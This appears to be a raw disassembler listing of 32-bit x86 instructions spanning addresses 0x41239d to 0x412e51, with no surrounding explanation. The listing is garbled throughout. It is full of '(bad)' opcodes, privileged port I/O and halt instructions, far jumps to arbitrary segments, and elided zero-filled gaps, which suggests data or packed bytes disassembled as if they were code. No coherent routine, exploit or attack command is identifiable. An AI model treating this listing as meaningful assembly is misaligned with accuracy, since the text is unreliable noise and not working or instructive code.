  41239d:	mov    al,0x20
  41239f:	ret    0x0
	...
  4123ca:	dec    ebp
  4123cb:	pop    ebx
  4123cc:	es aas 
  4123ce:	test   BYTE PTR cs:[ecx],bh
  4123d1:	jns    0x41244d
  4123d3:	imul   ebx,DWORD PTR [esi],0xffffffe7
  4123d6:	lods   eax,DWORD PTR ds:[esi]
  4123d7:	loopne 0x412381
  4123d9:	add    esi,DWORD PTR [edi+0x3e19f795]
  4123df:	push   eax
  4123e0:	jne    0x412395
  4123e2:	(bad)
  4123e6:	call   0xf7cd:0xbcaceeb4
  4123ed:	add    edx,DWORD PTR [ebx+0x5f]
  4123f0:	push   ecx
  4123f1:	add    esp,DWORD PTR [edi+esi*4-0x2a]
  4123f5:	ss ss inc ebx
  4123f8:	jae    0x412443
  4123fa:	ror    DWORD PTR [edi-0x39],0x36
  4123fe:	push   edx
  4123ff:	push   eax
  412400:	xor    eax,0x154c99fc
  412405:	lods   eax,DWORD PTR ds:[esi]
  412406:	test   al,0xe1
  412408:	and    al,0xb0
  41240a:	mov    al,ds:0x12acfbc5
  41240f:	arpl   WORD PTR [edi-0x68b00d8c],cx
  412415:	lods   al,BYTE PTR ds:[esi]
  412416:	adc    ah,BYTE PTR [edi-0x72]
  412419:	ss ss inc ebx
  41241c:	push   esp
  41241d:	dec    esi
  41241e:	jns    0x41246f
  412420:	jno    0x412468
  412422:	jbe    0x412473
  412424:	add    esp,edi
  412426:	push   ecx
  412427:	push   eax
  412428:	je     0x41240b
  41242a:	(bad)
  41242d:	data16 add BYTE PTR [eax],al
	...
  412458:	stos   BYTE PTR es:[edi],al
  412459:	push   eax
  41245a:	je     0x412451
  41245c:	mov    ds:0x7d4108c6,al
  412461:	scas   al,BYTE PTR es:[edi]
  412462:	std    
  412463:	dec    esi
  412464:	(bad)  
  412465:	xchg   esi,eax
  412466:	adc    al,0x6a
  412468:	and    eax,0xbeed724f
  41246d:	iret   
  41246e:	cld    
  41246f:	in     al,0x71
  412471:	pusha  
  412472:	sub    DWORD PTR [ecx+edx*8-0x9118ba9],0xff305e0e
  41247d:	push   0x0
  41247f:	dec    eax
  412480:	mov    cl,0xe0
  412482:	aas    
  412483:	jmp    0xac795b74
  412488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412489:	enter  0xd205,0xfd
  41248d:	lods   eax,DWORD PTR ds:[esi]
  41248e:	(bad)  
  41248f:	sub    edx,DWORD PTR [ecx+0x5b]
  412492:	sub    DWORD PTR [ecx+edx*4+0x57],0xc7a4f773
  41249a:	adc    al,0xde
  41249c:	packsswb mm5,mm0
  41249f:	add    DWORD PTR [edi+0x4e],esi
  4124a2:	(bad)  
  4124a3:	pusha  
  4124a4:	jg     0x4124c9
  4124a6:	imul   ebp,ecx,0xd1005c3d
  4124ac:	mov    esp,0x2bb6fdbc
  4124b1:	xchg   edi,eax
  4124b2:	hlt    
  4124b3:	add    dl,ch
  4124b5:	inc    ecx
  4124b6:	adc    esp,DWORD PTR [esi+0x14fd674f]
	...
  4124e4:	add    BYTE PTR [eax],al
  4124e6:	xchg   edx,eax
  4124e7:	ss xor al,0x34
  4124ea:	aad    0x4d
  4124ec:	mov    dh,BYTE PTR [esi+ecx*8]
  4124ef:	jecxz  0x4124f5
  4124f1:	add    ch,bh
  4124f3:	cdq    
  4124f4:	cmp    DWORD PTR [ebp-0x41],edi
  4124f7:	test   edi,esp
  4124f9:	mov    ebx,DWORD PTR [edx]
  4124fb:	imul   eax,DWORD PTR [ecx+0xd8b5738],0xffffffff
  412502:	jp     0x412502
  412504:	in     eax,0x41
  412506:	test   DWORD PTR [ecx],eax
  412508:	jmp    FWORD PTR [ebx]
  41250a:	pop    ss
  41250b:	mov    ds:0x5a4bc2c7,al
  412510:	cmp    DWORD PTR [ebp-0x7d],0xb8850d5c
  412517:	push   esi
  412518:	add    BYTE PTR [eax],al
  41251a:	cmp    al,0x2
  41251c:	jmp    0x41258c
  41251e:	pushf  
  41251f:	lods   al,BYTE PTR ds:[esi]
  412520:	hlt    
  412521:	mov    ebp,DWORD PTR [ebx]
  412523:	rol    BYTE PTR [edx],0x45
  412526:	aaa    
  412527:	ins    DWORD PTR es:[edi],dx
  412528:	add    BYTE PTR [eax+0x30],dl
  41252b:	mov    WORD PTR [eax],cs
  41252d:	call   0x3ec59e
  412532:	inc    eax
  412533:	mov    WORD PTR [edi+edi*8],ss
  412536:	push   0x52
  412538:	out    0xb9,al
  41253a:	rol    DWORD PTR [eax],cl
  41253c:	dec    DWORD PTR [ecx+0x68059a]
  412542:	loopne 0x4124ce
  412544:	adc    al,0xff
  412546:	push   0x4f
  412548:	out    0x49,al
	...
  412572:	add    BYTE PTR [eax],al
  412574:	out    dx,eax
  412575:	add    bh,bh
  412577:	mov    esp,DWORD PTR [edx]
  412579:	imul   eax,DWORD PTR [ecx+0xd8aa739],0xffffffff
  412580:	push   0xb
  412582:	out    0xed,al
  412584:	test   BYTE PTR [ecx],0xff
  412587:	sub    edx,edi
  412589:	mov    al,ds:0x599bc2c7
  41258e:	std    
  41258f:	jne    0x4125d0
  412591:	add    dh,BYTE PTR [ebp+0x14]
  412594:	ds in  eax,0x30
  412597:	int3   
  412598:	and    DWORD PTR [esi-0x8],0x9a4bf3fe
  41259f:	xchg   edx,eax
  4125a0:	jo     0x41256e
  4125a2:	stos   BYTE PTR es:[edi],al
  4125a3:	or     bh,BYTE PTR [esi+0x4e]
  4125a6:	sti    
  4125a7:	(bad)  
  4125a8:	jmp    0x412571
  4125aa:	cdq    
  4125ab:	(bad)
  4125ae:	stos   BYTE PTR es:[edi],al
  4125af:	sub    bh,BYTE PTR [esi+0xc]
  4125b2:	mov    ebp,0x434432c1
  4125b7:	cmp    eax,ebx
  4125b9:	stos   DWORD PTR es:[edi],eax
  4125ba:	xor    ecx,DWORD PTR [ebp-0xf5efc7]
  4125c0:	stos   DWORD PTR es:[edi],eax
  4125c1:	es stos DWORD PTR es:[edi],eax
  4125c3:	je     0x4125bb
  4125c5:	test   DWORD PTR [eax],esi
  4125c7:	or     al,0x21
  4125c9:	or     dl,bh
  4125cb:	out    0xa0,eax
  4125cd:	je     0x412579
  4125cf:	inc    BYTE PTR [ebp-0x7e]
  4125d2:	cli    
  4125d3:	test   BYTE PTR [ebx+eax*2+0x2],ch
	...
  4125ff:	add    BYTE PTR [eax],al
  412601:	add    BYTE PTR [ecx],al
  412603:	call   0xe4150db5
  412608:	stos   BYTE PTR es:[edi],al
  412609:	(bad)  
  41260a:	and    eax,0xfcc94a82
  41260f:	cs add ch,cl
  412612:	and    BYTE PTR [ebx+0x2],al
  412615:	add    BYTE PTR [ebp+0x410ca8b7],bh
  41261b:	mov    bh,0xf0
  41261d:	add    BYTE PTR [esi],bh
  41261f:	inc    edx
  412620:	(bad)  
  412622:	xlat   BYTE PTR ds:[ebx]
  412623:	push   esi
  412624:	add    DWORD PTR [eax],eax
  412626:	ds leave 
  412628:	dec    ebp
  412629:	hlt    
  41262a:	lds    esi,FWORD PTR [esi]
  41262c:	ins    BYTE PTR es:[edi],dx
  41262d:	add    al,BYTE PTR [ebx]
  41262f:	adc    bl,BYTE PTR [edi]
  412631:	add    BYTE PTR [esi],cl
  412633:	std    
  412634:	sub    eax,0xee5ba608
  412639:	dec    edx
  41263a:	xchg   ecx,eax
  41263b:	dec    esp
  41263c:	adc    al,BYTE PTR [ecx+ecx*4]
  41263f:	(bad)  
  412640:	sti    
  412641:	test   al,0xa
  412643:	arpl   WORD PTR [edi+0x65],di
  412646:	jo     0x412694
  412648:	xchg   DWORD PTR [ebp+0x2],edi
  41264b:	addr16 push 0xffffffeb
  41264e:	imul   eax,edi,0x46eaa8e6
  412654:	add    BYTE PTR [ecx-0x21],0x4b
  412658:	fst    QWORD PTR [bx+di+0x30ac]
  41265d:	(bad)  
  41265e:	sub    eax,0xcdd5e25b
  412663:	push   ebp
  412664:	inc    eax
  412665:	cwde   
	...
  41268e:	add    BYTE PTR [eax],al
  412690:	cmp    DWORD PTR [eax+ebp*8+0x7a],ecx
  412694:	jp     0x4126d5
  412696:	rol    BYTE PTR [ebx],cl
  412698:	sub    esi,eax
  41269a:	fld    TBYTE PTR [eax+0x353f63aa]
  4126a0:	adc    DWORD PTR [edi+eiz*1+0x7d],ecx
  4126a4:	and    BYTE PTR [edi+0x6a],0xeb
  4126a8:	or     edi,eax
  4126aa:	out    0xa8,al
  4126ac:	mov    al,BYTE PTR [edi+0x0]
  4126af:	adc    DWORD PTR [edi+0x4c],ebx
  4126b2:	pop    es
  4126b3:	fnsave [ecx+0x4dc630ab]
  4126b9:	pop    ebx
  4126ba:	imul   dh
  4126bc:	int    0xdc
  4126be:	test   al,0x3
  4126c0:	leave  
  4126c1:	xchg   ebp,eax
  4126c2:	iret   
  4126c3:	jl     0x41273f
  4126c5:	inc    ebx
  4126c6:	imul   ebx,DWORD PTR [ebx-0x137e5cb],0x14
  4126cd:	sub    DWORD PTR [ecx-0x17b44658],edx
  4126d3:	mov    al,0xae
  4126d5:	xlat   BYTE PTR ds:[ebx]
  4126d6:	iret   
  4126d7:	adc    BYTE PTR [edi-0x4536ff6b],dh
  4126dd:	mov    esi,0x971b0ae8
  4126e2:	in     al,dx
  4126e3:	loop   0x412735
  4126e5:	inc    ebx
  4126e6:	jbe    0x4126d3
  4126e8:	stos   BYTE PTR es:[edi],al
  4126e9:	sub    BYTE PTR [ecx],0xbb
  4126ec:	add    dl,BYTE PTR [edi+0x3b38c2ec]
  4126f2:	mov    dh,BYTE PTR [eax+eax*1]
	...
  41271d:	add    dl,dl
  41271f:	fdivr  DWORD PTR [edi+0x542c2ca]
  412725:	jle    0x4126d3
  412727:	pop    eax
  412728:	push   ebx
  412729:	mov    esp,edx
  41272b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41272c:	in     al,0x72
  41272e:	adc    BYTE PTR [ebx+0x3a],al
  412731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412732:	test   eax,0x6203c8
  412737:	cmp    ebp,edx
  412739:	jmp    0x6f60:0x46e49fba
  412740:	std    
  412741:	mov    ah,0xd1
  412743:	call   0x36a0:0x4325bcfd
  41274a:	out    0x49,al
  41274c:	or     ch,BYTE PTR [ecx]
  41274e:	pusha  
  41274f:	pop    edx
  412750:	std    
  412751:	xchg   esp,eax
  412752:	fld    DWORD PTR [edx-0x64]
  412755:	mov    esi,edx
  412757:	dec    ecx
  412758:	sub    ch,BYTE PTR [ecx]
  41275a:	xchg   BYTE PTR [ebx+eax*8],dl
  41275d:	fnstsw WORD PTR ds:0x6a1d43d4
  412763:	sbb    cl,BYTE PTR [esp+ebp*4-0x5b74650f]
  41276a:	add    eax,0xc4d1529b
  41276f:	inc    ebp
  412770:	(bad)  
  412771:	fimul  WORD PTR [ebx-0x61]
  412774:	rcl    dh,1
  412776:	(bad)  
  412778:	jmp    0xfe8b3153
  41277d:	add    BYTE PTR [esp+esi*2],ah
  412780:	rol    BYTE PTR [eax],1
	...
  4127aa:	add    BYTE PTR [eax],al
  4127ac:	jae    0x412802
  4127ae:	cmp    DWORD PTR [ebp-0x31],0xe817745f
  4127b5:	mov    esp,ss
  4127b7:	push   DWORD PTR [edx]
  4127b9:	pop    ss
  4127ba:	push   DWORD PTR [ebp-0x65]
  4127bd:	add    DWORD PTR [ebp+0x8],esi
  4127c0:	test   al,0xac
  4127c2:	sbb    bh,bh
  4127c4:	push   edx
  4127c5:	pop    ss
  4127c6:	out    0x2,al
  4127c8:	mov    esp,0x7c47ff02
  4127cd:	jae    0x4127c7
  4127cf:	pmullw mm5,QWORD PTR ds:0x1e8fffc
  4127d6:	jne    0x4127cc
  4127d8:	out    dx,eax
  4127d9:	popf   
  4127da:	pusha  
  4127db:	(bad)  
  4127dc:	call   0x57412897
  4127e1:	pop    esi
  4127e2:	pop    ebp
  4127e3:	leave  
  4127e4:	imul   eax,DWORD PTR gs:[eax],0x55
  4127e8:	lods   al,BYTE PTR ds:[esi]
  4127e9:	jecxz  0x412841
  4127eb:	push   edx
  4127ed:	inc    ebp
  4127ee:	out    0xd2,al
  4127f0:	stc    
  4127f1:	add    bh,bh
  4127f3:	push   0x3f7b4c
  4127f8:	pop    eax
  4127f9:	mov    WORD PTR [eax],cs
  4127fb:	call   0x41ab93
  412800:	sbb    al,0x1e
  412802:	jne    0x412809
  412804:	test   al,0x6
  412806:	ror    BYTE PTR [eax],0xe7
  412809:	pop    es
  41280a:	(bad)  
  41280b:	(bad)  
  41280c:	call   0x129309b
	...
  412839:	add    BYTE PTR [esi],ah
  41283b:	jno    0x41283a
  41283d:	jmp    FWORD PTR [eax]
  41283f:	hlt    
  412840:	popa   
  412841:	inc    ecx
  412842:	out    0x0,eax
  412844:	jne    0x41284e
  412846:	adc    bh,ah
  412848:	jae    0x412895
  41284a:	ds xor al,0x2
  41284d:	or     edi,DWORD PTR [esi-0x52]
  412850:	call   FWORD PTR [esi-0x79]
  412853:	cmc    
  412854:	stc    
  412855:	jmp    DWORD PTR [ebp-0x5e473dbc]
  41285b:	adc    BYTE PTR [edi-0x16367302],ah
  412861:	push   es
  412862:	or     edx,esp
  412864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412865:	je     0x41289d
  412867:	in     al,dx
  412868:	jo     0x4128b3
  41286a:	ds xor al,0xfb
  41286d:	mov    edi,0xc9473ef3
  412872:	jl     0x4128bf
  412874:	add    ch,BYTE PTR [eax+0x1b]
  412877:	pop    edi
  412878:	inc    ebx
  412879:	add    BYTE PTR [ecx+0x46],ah
  41287c:	cli    
  41287d:	out    0xff,eax
  41287f:	jl     0x412885
  412881:	add    BYTE PTR [ebp+0x74],al
  412884:	xor    BYTE PTR [ecx],cl
  412886:	dec    ecx
  412887:	test   BYTE PTR cs:[esi+0x4073d03b],0x3e
  41288f:	sbb    ch,dl
  412891:	fs jg  0x4128c6
  412894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412895:	je     0x4128cd
  412897:	stos   BYTE PTR es:[edi],al
  412898:	fimul  WORD PTR [edx+0x3e]
  41289b:	xor    bh,bl
  41289d:	mov    edi,0x0
	...
  4128c6:	add    BYTE PTR [eax],al
  4128c8:	xchg   ebx,eax
  4128c9:	cmp    esp,DWORD PTR [edi+0xd14274]
  4128cf:	mov    al,ds:0x6801f3b8
  4128d4:	jns    0x4128ad
  4128d6:	inc    esp
  4128d7:	add    cl,bh
  4128d9:	out    dx,eax
  4128da:	stc    
  4128db:	out    0x43,eax
  4128dd:	or     eax,0x72350002
  4128e2:	xor    BYTE PTR [ecx],cl
  4128e4:	loope  0x4128ad
  4128e6:	cmc    
  4128e7:	mov    es,WORD PTR [ebx-0x62]
  4128ea:	jae    0x41292c
  4128ec:	ds pop ebx
  4128ee:	lahf   
  4128ef:	add    edi,DWORD PTR [esi]
  4128f1:	pop    ebx
  4128f2:	out    0x44,eax
  4128f4:	neg    DWORD PTR ds:0xd41303e0
  4128fa:	mov    ebx,0x1e4f7d81
  4128ff:	dec    ebp
  412900:	push   ss
  412901:	push   eax
  412902:	inc    esp
  412903:	inc    ebx
  412904:	ds dec eax
  412906:	cmp    eax,0x2326a1fc
  41290b:	add    al,0x3e
  41290d:	push   esp
  41290e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290f:	das    
  412910:	inc    eax
  412911:	test   al,0x3d
  412913:	mov    ebx,0x43e75f7f
  412918:	lds    ecx,FWORD PTR [ebx+0x63]
  41291b:	daa    
  41291c:	inc    esi
  41291d:	xor    al,0xe9
  41291f:	pop    edi
  412920:	jmp    0x647010ad
  412925:	(bad)  
  412926:	jmp    FWORD PTR [edx-0x5b186623]
	...
  412954:	add    BYTE PTR [eax],al
  412956:	retf   0x4f52
  412959:	ins    DWORD PTR es:[edi],dx
  41295a:	hlt    
  41295b:	pop    edx
  41295c:	out    0xf8,eax
  41295e:	or     esi,0x129844ed
  412964:	sub    al,BYTE PTR [eax]
  412966:	ds aam 0xc4
  412969:	sti    
  41296a:	adc    al,0x7d
  41296c:	addr16 in eax,0x36
  41296f:	iret   
  412970:	rol    BYTE PTR [ebx+0xfb35658],1
  412976:	mov    esi,0x392ff187
  41297b:	fcmovnu st,st(6)
  41297d:	dec    eax
  41297e:	mov    dl,BYTE PTR [ebp+0x67]
  412981:	in     eax,0x9a
  412983:	iret   
  412984:	in     al,0x83
  412986:	xor    BYTE PTR [ebx+0x6000007c],bh
  41298c:	(bad)  
  41298d:	cmp    al,0xbe
  41298f:	xchg   DWORD PTR [eax],eax
  412991:	jmp    0xa5074bbe
  412996:	cdq    
  412997:	inc    edi
  412998:	(bad)  
  412999:	jmp    0xe18549db
  41299e:	cmp    eax,0x36e9005b
  4129a3:	(bad)  
  4129a4:	or     dl,al
  4129a6:	jbe    0x412983
  4129a8:	cmp    eax,0x8174590e
  4129ad:	cmp    al,0xd6
  4129af:	inc    edi
  4129b0:	jne    0x41298d
  4129b2:	jmp    0x5b:0x3de8f89e
  4129b9:	sbb    al,0x0
	...
  4129e3:	add    BYTE PTR [esi],dh
  4129e5:	and    BYTE PTR [ebp+ebx*4+0x3c],al
  4129e9:	pop    ebx
  4129ea:	add    cl,ch
  4129ec:	(bad)  
  4129ed:	ins    BYTE PTR es:[edi],dx
  4129ee:	cmc    
  4129ef:	and    al,0xa2
  4129f1:	pop    edx
  4129f2:	add    cl,ch
  4129f4:	cmp    eax,0x62a70ace
  4129f9:	lds    ebp,FWORD PTR [si]
  4129fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129fd:	inc    edi
  4129fe:	(bad)  
  4129ff:	jmp    0xc57f0541
  412a04:	sbb    BYTE PTR [esi-0x3],bl
  412a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a08:	xchg   ebp,eax
  412a09:	xor    al,0x6
  412a0b:	cs js  0x412a51
  412a0e:	add    ecx,ebp
  412a10:	cmp    eax,0xe1c4815b
  412a15:	pop    ebx
  412a16:	jae    0x412a02
  412a18:	jecxz  0x412a77
  412a1a:	and    BYTE PTR [esi-0x4bff7a43],ch
  412a20:	(bad)  
  412a21:	sar    DWORD PTR [ebx-0xf],1
  412a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a25:	bound  eax,QWORD PTR [eax+0x16d01dde]
  412a2b:	imul   esp,DWORD PTR [edx],0x4d94205c
  412a31:	scas   al,BYTE PTR es:[edi]
  412a32:	jmp    0x47060337
  412a37:	add    DWORD PTR [edi+0x47],ebp
  412a3a:	inc    edi
  412a3b:	adc    BYTE PTR [eax-0x3f0a8ca6],0x8f
  412a42:	inc    ebp
  412a43:	and    BYTE PTR [eax],0x5f
  412a46:	jae    0x412a27
	...
  412a70:	add    BYTE PTR [eax],al
  412a72:	cwde   
  412a73:	xchg   esp,eax
  412a74:	hlt    
  412a75:	add    BYTE PTR [edi+0xa8b005a],ah
  412a7b:	push   edi
  412a7c:	mov    DWORD PTR [ebp-0x51],edi
  412a7f:	cmc    
  412a80:	pop    ds
  412a81:	and    BYTE PTR [eax-0x16e38aca],0x52
  412a88:	add    bh,bh
  412a8a:	dec    edx
  412a8b:	jecxz  0x412ae0
  412a8d:	call   0x4026fe
  412a92:	mov    WORD PTR [edx],ds
  412a94:	jne    0x412a9c
  412a96:	xor    BYTE PTR [ecx+0x5a5bc2c7],bl
  412a9c:	mov    edi,esi
  412a9e:	sbb    edx,edi
  412aa0:	inc    esp
  412aa1:	hlt    
  412aa2:	sbb    bh,bl
  412aa4:	add    BYTE PTR ds:[edx+0x7],bl
  412aa8:	push   DWORD PTR [ebp-0x35]
  412aab:	sub    al,0xc
  412aae:	loope  0x412aa9
  412ab0:	(bad)  
  412ab1:	pop    edi
  412ab2:	adc    DWORD PTR [edi],0x832704c0
  412ab8:	mov    esp,ebp
  412aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412abb:	adc    eax,esi
  412abd:	push   esi
  412abe:	enter  0x7cdc,0x14
  412ac2:	pop    ss
  412ac3:	outs   dx,BYTE PTR ds:[esi]
  412ac4:	pop    es
  412ac5:	adc    DWORD PTR [edx],0xffffffc9
  412ac8:	dec    edx
  412ac9:	inc    ecx
  412aca:	daa    
  412acb:	pop    edx
  412acc:	jae    0x412ad4
  412ace:	add    BYTE PTR [edi+eax*8-0x76a5f83e],bl
  412ad5:	inc    ebp
	...
  412afe:	add    BYTE PTR [eax],al
  412b00:	ds dec eax
  412b02:	fld    QWORD PTR [edx+edx*8]
  412b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b06:	inc    ebx
  412b07:	add    BYTE PTR [ecx],bh
  412b09:	mov    cl,0x65
  412b0b:	add    BYTE PTR [esi],bh
  412b0d:	xor    al,0xdd
  412b0f:	add    al,0x9e
  412b11:	mov    ebp,0xb1410043
  412b16:	jns    0x412b18
  412b18:	ds xor al,0xdd
  412b1b:	add    al,0x9a
  412b1d:	mov    ch,0x44
  412b1f:	add    BYTE PTR [ecx-0x4f],cl
  412b22:	mov    es,WORD PTR [eax]
  412b24:	ds xor al,0x91
  412b27:	inc    esp
  412b28:	mov    dl,0x63
  412b2a:	pop    DWORD PTR [esi+eiz*4+0x63]
  412b2e:	pop    DWORD PTR [edx+ebx*4+0x63]
  412b32:	mov    eax,ds:0x44a5b234
  412b37:	add    BYTE PTR [ecx-0x3f180b9a],cl
  412b3d:	sti    
  412b3e:	mov    ds:0xac76cbfe,al
  412b43:	dec    edi
  412b44:	ret    
  412b45:	jle    0x412af7
  412b47:	dec    edi
  412b48:	mov    ebx,0x614f9476
  412b4d:	push   cs
  412b4e:	data16 (bad) 
  412b50:	push   DWORD PTR [ebx]
  412b52:	mov    ds:0x65dc2e74,eax
  412b57:	test   DWORD PTR [ecx-0x44],0x3624490
  412b5e:	xchg   ecx,eax
  412b5f:	inc    esp
  412b60:	push   ds
  412b61:	add    edx,DWORD PTR [ecx+0x44]
	...
  412b8b:	add    BYTE PTR [eax],al
  412b8d:	add    BYTE PTR [edx],bl
  412b8f:	add    esp,DWORD PTR [ebx+0x44ccde34]
  412b95:	add    BYTE PTR [ecx],ah
  412b97:	adc    dl,dh
  412b99:	out    0xc4,eax
  412b9b:	mov    ah,BYTE PTR [edx-0x59efee02]
  412ba1:	mov    es,WORD PTR [ebx-0x755dc4a5]
  412ba7:	daa    
  412ba8:	outs   dx,DWORD PTR ds:[esi]
  412ba9:	dec    eax
  412baa:	push   ss
  412bab:	sbb    eax,0x44f1b3ad
  412bb0:	call   0x33dfe6b8
  412bb5:	xor    edx,DWORD PTR [edx+ebx*2-0x6f]
  412bb9:	add    esp,DWORD PTR [ebx+ebx*2-0x7f]
  412bbd:	add    esp,DWORD PTR [ebx+ebx*2+0x5c]
  412bc1:	dec    eax
  412bc2:	repnz stos DWORD PTR es:[edi],eax
  412bc4:	out    0xf7,al
  412bc6:	nop
  412bc7:	nop
  412bc8:	sub    BYTE PTR [eax*2+0x4787e71b],al
  412bcf:	pop    edx
  412bd0:	out    0x3,eax
  412bd2:	mov    ebp,0x310497c6
  412bd7:	(bad)  
  412bd9:	add    bh,BYTE PTR [esi]
  412bdb:	pop    ebx
  412bdc:	bound  ecx,QWORD PTR [edi-0x7e]
  412bdf:	sbb    BYTE PTR [eax+ebp*4],0x38
  412be3:	fcomp  QWORD PTR [ebx-0x64a4c1fc]
  412be9:	(bad)  
  412bea:	repnz sub ah,BYTE PTR [ebx+0x1f]
  412bee:	xchg   edx,eax
  412bef:	rcr    BYTE PTR [eax+edx*8],1
	...
  412c1a:	add    BYTE PTR [eax],al
  412c1c:	pop    esp
  412c1d:	pop    ecx
  412c1e:	jp     0x412c88
  412c20:	pusha  
  412c21:	into   
  412c22:	stos   DWORD PTR es:[edi],eax
  412c23:	xchg   ecx,eax
  412c24:	add    bh,BYTE PTR [edi]
  412c26:	ja     0x412c3f
  412c28:	outs   dx,BYTE PTR ds:[esi]
  412c29:	xor    edi,DWORD PTR [eax+0x6a5b3e4b]
  412c2f:	pop    ds
  412c30:	inc    edx
  412c31:	pop    ebx
  412c32:	out    dx,al
  412c33:	xchg   DWORD PTR [ebx],ecx
  412c35:	pop    ebx
  412c36:	out    0x3,eax
  412c38:	mov    ebp,0x390457c5
  412c3d:	fild   QWORD PTR [ebx]
  412c3f:	add    al,0x3e
  412c41:	pop    ebx
  412c42:	push   0x1f
  412c44:	and    bl,BYTE PTR [ebx+0x0]
  412c47:	out    0xb9,al
  412c49:	add    DWORD PTR [ecx],eax
  412c4b:	jmp    0x25b5708d
  412c50:	rol    BYTE PTR [edx-0x2d60e1a5],cl
  412c56:	inc    ebx
  412c57:	and    DWORD PTR [edi+0x510efcce],ebx
  412c5d:	adc    edi,esi
  412c5f:	jl     0x412c2a
  412c61:	cmp    ebx,DWORD PTR [esi-0x64]
  412c64:	sahf   
  412c65:	inc    esp
  412c66:	imul   ebx,DWORD PTR [edi+0x1009a18],0xe9009c89
  412c70:	or     eax,0xfd4456b3
  412c75:	pop    edx
  412c76:	std    
  412c77:	pop    esp
  412c78:	cmp    BYTE PTR [ebx],0x84
  412c7b:	and    BYTE PTR [edx+0x5b],al
  412c7e:	or     DWORD PTR [ecx+0x0],ebp
	...
  412ca8:	add    BYTE PTR [eax],al
  412caa:	dec    ecx
  412cab:	arpl   WORD PTR [eax+0x1c],bp
  412cae:	popa   
  412caf:	call   0xe900:0x9c7cc100
  412cb6:	dec    ebp
  412cb7:	mov    bl,0x5b
  412cb9:	or     al,0xfd
  412cbb:	pop    edx
  412cbc:	std    
  412cbd:	adc    al,0x8a
  412cbf:	cmp    ebp,DWORD PTR [eax+0x20]
  412cc2:	cmp    bl,BYTE PTR [ebx+0x9]
  412cc5:	test   eax,0xc686351
  412cca:	sbb    DWORD PTR [edx-0x631f6f00],ebx
  412cd0:	add    cl,ch
  412cd2:	or     eax,0xfd0463b3
  412cd7:	pop    edx
  412cd8:	std    
  412cd9:	fdiv   QWORD PTR [ebp+0x3b]
  412cdc:	dec    esp
  412cdd:	mov    al,0x3d
  412cdf:	pop    ebx
  412ce0:	or     DWORD PTR [ecx],ebp
  412ce2:	dec    eax
  412ce3:	cwde   
  412ce4:	push   0xbf323de9
  412ce9:	add    BYTE PTR [eax+0x69],bh
  412cec:	or     al,0xe8
  412cee:	push   es
  412cef:	xchg   ch,bh
  412cf1:	dec    DWORD PTR [eax+0x29]
  412cf4:	xchg   esi,eax
  412cf5:	mov    ss,esi
  412cf7:	pop    esi
  412cf8:	std    
  412cf9:	jne    0x412d06
  412cfb:	not    DWORD PTR [edx+0x59]
  412cfe:	pop    eax
  412cff:	sti    
  412d00:	(bad)  
  412d01:	jne    0x412d4e
  412d03:	sti    
  412d04:	je     0x412cfa
  412d06:	cmp    BYTE PTR [ecx+0xc],ch
  412d09:	call   0x3eb2ca
	...
  412d36:	add    BYTE PTR [eax],al
  412d38:	fsubr  DWORD PTR [eax-0x10]
  412d3b:	call   DWORD PTR [edx-0xa]
  412d3e:	(bad)  
  412d3f:	jne    0x412d2c
  412d41:	imul   BYTE PTR [ecx+ebx*2-0x28]
  412d45:	loop   0x412d45
  412d47:	jne    0x412ccc
  412d49:	loop   0x412dbf
  412d4b:	fmul   QWORD PTR [eax+0x58e80c64]
  412d51:	cmp    ch,0xff
  412d54:	js     0x412dba
  412d56:	enter  0x57e8,0x9b
  412d5a:	std    
  412d5b:	jmp    FWORD PTR [eax]
  412d5d:	add    edi,0x535e67c2
  412d63:	mov    ebp,DWORD PTR [ebx-0x1b173e22]
  412d69:	jnp    0x412d7f
  412d6b:	add    eax,0x112d358
  412d70:	push   edi
  412d71:	pop    esi
  412d72:	mov    eax,DWORD PTR [ebp-0x1d]
  412d75:	xchg   BYTE PTR [ebx-0x747840bb],cl
  412d7b:	inc    ebp
  412d7c:	retf   
  412d7d:	xchg   BYTE PTR [edx+0x2],ch
  412d80:	fsub   DWORD PTR [ebx+0x10]
  412d83:	call   0x4017be
  412d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d89:	jl     0x412d83
  412d8b:	add    DWORD PTR [esi],edi
  412d8d:	cmp    DWORD PTR [ecx+0x2343ef2],ecx
  412d93:	jmp    FWORD PTR [ebx+0xe448d80]
  412d99:	sub    al,0xe4
  412d9b:	add    BYTE PTR fs:[eax],al
	...
  412dc6:	jg     0x412dfc
  412dc8:	lahf   
  412dc9:	je     0x412dd9
  412dcb:	pushf  
  412dcc:	jge    0x412e14
  412dce:	ds xor al,0xb
  412dd1:	ror    BYTE PTR [ecx-0x49],0xbc
  412dd5:	push   ecx
  412dd7:	xor    edx,DWORD PTR [ecx-0x6efc0dbc]
  412ddd:	inc    esp
  412dde:	out    0xe3,al
  412de0:	nop
  412de1:	inc    esp
  412de2:	(bad)  
  412de4:	daa    
  412de5:	add    cl,dl
  412de7:	mov    esi,0x49e0e7f1
  412dec:	lahf   
  412ded:	(bad)  
  412dee:	mov    ebp,0x49009cb6
  412df3:	mov    bh,0x59
  412df5:	push   DWORD PTR [ecx-0x4d8b60cd]
  412dfb:	fwait
  412dfc:	xchg   ebx,eax
  412dfd:	arpl   di,di
  412dff:	xor    ebp,DWORD PTR [edx+0x2340145]
  412e05:	or     edi,DWORD PTR [esi+0x38]
  412e08:	mov    DWORD PTR [edx-0x72fdcbc2],esp
  412e0e:	sti    
  412e0f:	fbstp  TBYTE PTR [ecx]
  412e11:	lea    eax,[ebx]
  412e13:	cld    
  412e14:	xor    DWORD PTR [ebp+0x6a31e7fb],ecx
  412e1a:	cmp    eax,0x561018d1
  412e1f:	adc    BYTE PTR [ebx+0x20b459fe],0xf8
  412e26:	cmp    DWORD PTR ds:[ecx+0x82],ecx
	...
  412e51:	add    BYTE PTR [eax],al
